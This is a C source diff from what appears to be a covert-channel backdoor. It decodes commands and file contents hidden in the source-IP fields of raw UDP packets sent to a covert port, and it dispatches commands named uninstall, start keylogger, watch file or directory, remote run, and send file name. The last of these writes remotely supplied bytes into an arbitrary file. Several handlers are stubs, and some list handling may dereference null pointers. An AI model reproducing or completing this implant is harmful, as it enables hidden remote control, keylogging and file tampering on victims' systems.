@@ -1,15 +1,123 @@
+#include "commands.h"
 #include "runner.h"
 #include "network.h"
-#include "commands.h"
 
 #include <errno.h>
 #include <arpa/inet.h>
 #include <netinet/ip.h>
 #include <netinet/udp.h>
 #include <stdio.h>
+#include <stdlib.h>
 #include <sys/socket.h>
 #include <sys/time.h>
 #include <unistd.h>
+
+void print_blob(struct Blob *blob) {
+    printf("Data1: %u\n", blob->data1);
+    printf("Data2: %u\n", blob->data2);
+    printf("Seq Num: %u\n", blob->seq_num);
+    printf("Marked: %u\n", blob->marked);
+}
+
+void print_list(struct List *list) {
+    if (list == NULL) {
+        printf("List is NULL\n");
+        return;
+    }
+
+    printf("===== LIST DUMP =====\n");
+    printf("Type: %d\n", list->type);
+
+    struct Blob *curr = list->head->next;
+    while (curr != list->tail && curr != NULL) {
+        print_blob(curr);
+        printf("\n--------------------------\n");
+        curr = curr->next;
+    }
+
+    printf("=====================\n");
+}
+
+void free_list(struct List *list) {
+    printf("Freeing list\n");
+    struct Blob *curr = list->head;
+
+    while (curr != NULL) {
+        struct Blob *next = curr->next;
+        free(curr);
+        curr = next;
+    }
+}
+
+int runner_recv(struct Context *ctx, struct List *list) {
+    int is_term = 0;
+    int is_first = 1;
+    while (is_term == 0) {
+        uint8_t buffer[BUF_SIZE];
+
+        ssize_t ret = recv(ctx->covert_fd, buffer, BUF_SIZE, 0);
+        if (ret < 0) {
+            fprintf(stderr, "recv error\n");
+            close(ctx->covert_fd);
+            return -1;
+        }
+
+        const struct iphdr *ip = (struct iphdr *)buffer;
+        if (ip->protocol != IPPROTO_UDP) {
+            fprintf(stderr, "packet received is not UDP\n");
+            return -1;
+        }
+
+        const struct udphdr *udp = (struct udphdr *)(buffer + ip->ihl*4);
+
+        if (ntohs(udp->dest) == COVERT_CHAN) {
+            struct Blob *blob = calloc(1, sizeof(struct Blob));
+            if (is_first) {
+                list->head = blob;
+                list->tail = blob;
+                is_first = 0;
+            } else {
+                blob->prev = list->tail;
+                list->tail->next = blob;
+                list->tail = blob;
+            }
+
+            // print_packet_info(buffer);
+            char ip_buffer[INET_ADDRSTRLEN];
+            inet_ntop(AF_INET, &ip->saddr, ip_buffer, sizeof(ip_buffer));
+
+            uint8_t byte1 = 0;
+            uint8_t byte2 = 0;
+            uint8_t byte3 = 0;
+            uint8_t byte4 = 0;
+
+            decode_ip(ip_buffer, &byte1, &byte2, &byte3, &byte4);
+            printf("------------------Packet num: %u------------------\n", ntohs(udp->source));
+            printf("Full IP: %s\n", ip_buffer);
+            printf("Type: ");
+            if (byte2 == 0) {
+                printf("Command\n");
+                list->type = byte4;
+            } else if (byte2 == 1) {
+                printf("Term\n");
+                is_term = 1;
+            } else {
+                printf("Data\n");
+                printf("Packet secret data: %u %u\n", byte3, byte4);
+                blob->data1 = byte3;
+                blob->data2 = byte4;
+            }
+
+            blob->seq_num = ntohs(udp->source);
+            blob->marked = 0;
+        }
+
+    }
+
+    print_list(list);
+
+    return 0;
+}
 
 int runner(struct Context *ctx) {
     // if command = disconnect, return 1
@@ -29,51 +137,97 @@ int runner(struct Context *ctx) {
     }
 
     int run = 1;
-    uint8_t buffer[BUF_SIZE];
+
     while (run) {
-        ssize_t ret = recv(ctx->covert_fd, buffer, BUF_SIZE, 0);
-        if (ret < 0) {
-            fprintf(stderr, "recv error\n");
-            close(ctx->covert_fd);
-            return -1;
+        printf("Waiting for command...\n");
+        struct List cmd_list = {0};
+        runner_recv(ctx, &cmd_list);
+        switch (cmd_list.type) {
+            case CMD_UNINSTALL:
+                printf("Uninstall command received\n");
+                run = 0;
+                break;
+            case CMD_REQ_FILE_NAME:
+                printf("Request file name received\n");
+                break;
+            case CMD_SEND_FILE_NAME:
+                printf("Send file name received\n");
+                cmd_send_file_name(ctx, &cmd_list);
+                break;
+            case CMD_START_KL:
+                printf("Start kl command received\n");
+                break;
+            case CMD_START_WATCH_FILE:
+                printf("Start watch file command received\n");
+                break;
+            case CMD_START_WATCH_DIR:
+                printf("Start watch directory command received\n");
+                break;
+            case CMD_REMOTE_RUN:
+                printf("Remote run command received\n");
+                break;
+            case CMD_DISCONNECT:
+                printf("Disconnect command received\n");
+                free_list(&cmd_list);
+                return 1;
+            default:
+                printf("Unknown command received\n");
+                break;
         }
 
-        const struct iphdr *ip = (struct iphdr *)buffer;
-        if (ip->protocol != IPPROTO_UDP) {
-            fprintf(stderr, "packet received is not UDP\n");
-            return -1;
-        }
-
-        const struct udphdr *udp = (struct udphdr *)(buffer + ip->ihl*4);
-
-        if (ntohs(udp->dest) == COVERT_CHAN) {
-            // print_packet_info(buffer);
-            char ip_buffer[INET_ADDRSTRLEN];
-            inet_ntop(AF_INET, &ip->saddr, ip_buffer, sizeof(ip_buffer));
-
-            uint8_t byte1 = 0;
-            uint8_t byte2 = 0;
-            uint8_t byte3 = 0;
-            uint8_t byte4 = 0;
-
-            decode_ip(ip_buffer, &byte1, &byte2, &byte3, &byte4);
-            printf("------------------Packet num: %u------------------\n", ntohs(udp->source));
-            printf("Full IP: %s\n", ip_buffer);
-            printf("Type: ");
-            if (byte2 == 0) {
-                printf("Command\n");
-            } else if (byte2 == 1) {
-                printf("Term\n");
-            } else {
-                printf("Data\n");
-                printf("Packet secret data: %u %u\n", byte3, byte4);
-            }
-
-
-        }
+        free_list(&cmd_list);
 
     }
 
+    return 0;
+}
+
+FILE *open_file_from_list(struct List *list) {
+    if (list == NULL) return NULL;
+
+    char filename[256];
+    int i = 0;
+
+    struct Blob *curr = list->head->next;
+
+    while (curr != list->tail && i < sizeof(filename) - 1) {
+        filename[i++] = curr->data1;
+
+        if (i < sizeof(filename) - 1)
+            filename[i++] = curr->data2;
+
+        curr = curr->next;
+    }
+
+    filename[i] = '\0';
+
+    FILE *fp = fopen(filename, "a+");  // opens or creates file
+    if (fp == NULL) {
+        perror("fopen");
+        return NULL;
+    }
+
+    return fp;
+}
+
+int cmd_send_file_name(struct Context *ctx, struct List *list) {
+    FILE *fp = open_file_from_list(list);
+    if (fp == NULL) {
+        return -1;
+    }
+
+    struct List data_list = {0};
+    runner_recv(ctx, &data_list);
+
+    struct Blob *curr = data_list.head->next;
+
+    while (curr != data_list.tail) {
+        fputc(curr->data1, fp);
+        fputc(curr->data2, fp);
+        curr = curr->next;
+    }
+
+    fclose(fp);
     return 0;
 }
 
@@ -144,3 +298,13 @@ int listen_knock(struct Context *ctx) {
     return 0;
 
 }
+
+int encode_ip(char *buffer, uint8_t byte1, uint8_t byte2, uint8_t byte3, uint8_t byte4) {
+    return sprintf(buffer, "%u.%u.%u.%u", byte1, byte2, byte3, byte4);
+}
+
+
+int decode_ip(char *buffer, uint8_t *byte1, uint8_t *byte2, uint8_t *byte3, uint8_t *byte4) {
+    return sscanf(buffer, "%hhu.%hhu.%hhu.%hhu", byte1, byte2, byte3, byte4);
+}
+
